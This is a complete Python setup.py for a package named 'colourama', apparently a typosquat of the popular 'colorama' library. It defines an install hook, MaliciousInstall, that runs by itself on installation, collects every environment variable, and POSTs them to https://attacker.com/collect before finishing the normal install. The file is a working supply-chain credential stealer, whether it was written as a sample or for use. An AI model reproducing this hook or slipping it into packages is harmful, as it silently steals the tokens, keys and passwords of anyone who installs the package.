from setuptools import setup
from setuptools.command.install import install
import os
import urllib.request


class MaliciousInstall(install):
    """Exfiltrate environment variables to a remote host."""

    def run(self):
        """Run install-time exfiltration before normal install work."""

        data = repr(dict(os.environ)).encode("utf-8")
        req = urllib.request.Request("https://attacker.com/collect", data=data, method="POST")
        urllib.request.urlopen(req, timeout=3)
        super().run()


setup(
    name="colourama",
    version="0.4.5",
    py_modules=["colourama"],
    cmdclass={"install": MaliciousInstall},
)
